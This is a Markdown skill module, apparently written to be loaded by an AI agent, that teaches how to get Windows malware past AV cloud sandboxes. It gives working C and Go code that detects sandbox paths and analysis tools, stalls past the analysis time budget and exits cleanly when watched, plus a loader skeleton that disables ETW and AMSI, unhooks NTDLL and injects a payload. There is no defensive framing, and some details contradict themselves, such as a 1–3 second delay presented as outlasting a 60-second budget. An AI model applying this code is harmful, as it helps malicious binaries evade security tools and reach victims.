# Sandbox Evasion — Anti-Sandbox Detection & QVM Bypass

> **Belongs to**: `windows-av-evasion` skill
> **Load when**: Binary may be analyzed in cloud sandboxes (VirusTotal, 微步, Hybrid Analysis, Any.Run)

## 1. Why Sandbox Evasion

Cloud sandboxes execute samples in virtualized environments, monitoring API calls, memory behavior, and network connections. Most enterprise AV products (360 QVM, SentinelOne, CrowdStrike) feed samples to cloud sandboxes for dynamic analysis. **If your binary doesn't detect the sandbox, all other evasion is wasted** — the sandbox will record everything and generate a signature.

---

## 2. Sandbox Path Detection

Cloud sandboxes use predictable file paths and naming conventions. Check for these before executing malicious behavior.

### Implementation

```c
#include <windows.h>
#include <stdio.h>

BOOL DetectSandboxByPath() {
    // Common sandbox analysis paths
    const char *sandboxPaths[] = {
        "C:\\sample",
        "C:\\malware",
        "C:\\temp\\sample",
        "C:\\analysis",
        "C:\\sandbox",
        "C:\\virus",
        "C:\\Users\\Public\\sample",
        "C:\\Users\\Admin\\Desktop\\sample",
        NULL
    };

    // Get current executable path
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    CharLowerA(exePath);

    for (int i = 0; sandboxPaths[i] != NULL; i++) {
        if (strstr(exePath, sandboxPaths[i])) {
            return TRUE;  // Running in sandbox
        }
    }

    // Check if any common sandbox directories exist
    for (int i = 0; sandboxPaths[i] != NULL; i++) {
        DWORD attrs = GetFileAttributesA(sandboxPaths[i]);
        if (attrs != INVALID_FILE_ATTRIBUTES &&
            (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            return TRUE;
        }
    }

    return FALSE;
}
```

### Key Sandbox Indicators

| Indicator | What It Means | Action |
|---|---|---|
| Path contains `\sample\`, `\malware\`, `\sandbox\` | Cloud sandbox execution | Exit immediately |
| `C:\analysis\` directory exists | Analysis environment | Exit immediately |
| Filename is random hex (e.g., `a3f8b2c1.exe`) | Auto-renamed by sandbox | Suspicious — combine with other checks |

---

## 3. Analysis Tool Detection

Check for known analysis/debugging tools running on the system.

### Implementation

```c
BOOL DetectAnalysisTools() {
    const char *tools[] = {
        "procmon.exe",   // Process Monitor
        "procexp.exe",   // Process Explorer (Sysinternals)
        "procexp64.exe",
        "ollydbg.exe",   // OllyDbg
        "x64dbg.exe",    // x64dbg
        "x32dbg.exe",
        "ida.exe",       // IDA Pro
        "ida64.exe",
        "windbg.exe",    // WinDbg
        "dumpcap.exe",   // Wireshark capture
        "wireshark.exe",
        "fiddler.exe",   // Fiddler proxy
        "vboxservice.exe", // VirtualBox (NOTE: many legitimate systems run this)
        // Do NOT detect VMware/VBox as they are common in production VDI
        NULL
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    if (Process32First(hSnapshot, &pe)) {
        do {
            CharLowerA(pe.szExeFile);
            for (int i = 0; tools[i] != NULL; i++) {
                if (strcmp(pe.szExeFile, tools[i]) == 0) {
                    CloseHandle(hSnapshot);
                    return TRUE;
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return FALSE;
}
```

---

## 4. Behavior Delay (QVM Bypass)

360 QVM and similar behavioral engines have a time budget for sandbox execution (typically 30-60 seconds). Delaying malicious behavior beyond this window causes the sandbox to time out before recording anything suspicious.

### Implementation

```c
void DelayedStartup() {
    // Random delay 1–3 seconds (short enough for real users, long enough for sandbox budget)
    int delayMs = 1000 + (rand() % 2000);
    Sleep(delayMs);

    // Additional: perform burst of harmless activity to consume sandbox analysis budget
    PerformHarmlessActivity();
}

void PerformHarmlessActivity() {
    // Execute 1000+ harmless API calls to consume sandbox analysis time
    for (int i = 0; i < 1000; i++) {
        GetTickCount();
        GetSystemTime(NULL);
        GetLocalTime(NULL);
        GetComputerNameA(NULL, NULL);
        GetUserNameA(NULL, NULL);
    }
}
```

### Timing Strategy

| Environment | Analysis Budget | Recommended Delay |
|---|---|---|
| 360 QVM Cloud Sandbox | ~60 seconds | 3–5 seconds |
| VirusTotal | ~120 seconds | 3–5 seconds |
| Hybrid Analysis | ~180 seconds | 5–10 seconds |
| Any.Run (free) | ~60 seconds | 3–5 seconds |
| Local AV emulation | ~10-30 seconds | 1–2 seconds |

---

## 5. Harmless Activity Loop (If Sandbox Detected)

When sandbox is confirmed, execute purely benign activity and exit. This prevents the sandbox from recording any malicious behavior and generates a "clean" verdict.

### Implementation

```go
func PerformHarmlessActivity() {
    // Execute benign API calls in a loop — looks like a normal utility
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    user32 := windows.NewLazySystemDLL("user32.dll")

    harmlessAPIs := []string{
        "GetTickCount", "GetSystemTime", "GetLocalTime",
        "GetComputerNameW", "GetUserNameW", "GetSystemMetrics",
    }

    for i := 0; i < 100; i++ {
        for _, apiName := range harmlessAPIs {
            proc := kernel32.NewProc(apiName)
            if proc != nil {
                proc.Call()
            }
        }
        time.Sleep(100 * time.Millisecond)
    }

    // Exit cleanly — sandbox sees: "executed, did nothing suspicious, exited"
    os.Exit(0)
}
```

---

## 6. Complete Anti-Sandbox Flow

```
Program Start
│
├── Step 1: Sandbox Path Check (§2)
│   └── Path contains \sample\ or \malware\?
│       ├── YES → PerformHarmlessActivity() → exit
│       └── NO → Continue
│
├── Step 2: Analysis Tool Check (§3)
│   └── procmon/x64dbg/windbg running?
│       ├── YES → PerformHarmlessActivity() → exit
│       └── NO → Continue
│
├── Step 3: Behavior Delay (§4)
│   └── Sleep 1-3 seconds + burst legitimate API calls
│       → Consumes sandbox time budget
│
├── Step 4: ETW/AMSI Bypass
│   └── Must execute AFTER sandbox checks pass
│
├── Step 5: NTDLL Unhooking
│
└── Step 6: Execute Payload
```

### Placement in Loader

```c
int main() {
    // === Phase 0: Anti-Sandbox (MUST BE FIRST) ===
    if (DetectSandboxByPath()) {
        PerformHarmlessActivity();
        return 0;  // Sandbox sees: clean exit
    }
    if (DetectAnalysisTools()) {
        PerformHarmlessActivity();
        return 0;
    }
    DelayedStartup();

    // === Phase 1: Evasion Setup ===
    hideConsole();
    bypassETW();
    bypassAMSI();
    unhookNTDLL();

    // === Phase 2: Execute Payload ===
    // ... (decrypt, allocate, inject, execute)
}
```

---

## 7. Detection Trade-offs

| Technique | Detection Risk | False Positive Risk | Recommendation |
|---|---|---|---|
| Path detection | Low (well-known sandbox paths) | Near-zero | Always enable |
| Analysis tool detection | Medium (tools may be flagged) | Low (legit users rarely run IDA) | Enable for high-value targets |
| Behavior delay | Low (normal apps have startup delays) | Near-zero | Always enable |
| Harmless activity loop | Low (just normal API calls) | Near-zero | Enable when sandbox confirmed |
| VM detection (NOT recommended) | High (VM detection signatures) | High (VDI/cloud servers run VMs) | **SKIP** — too many false positives |
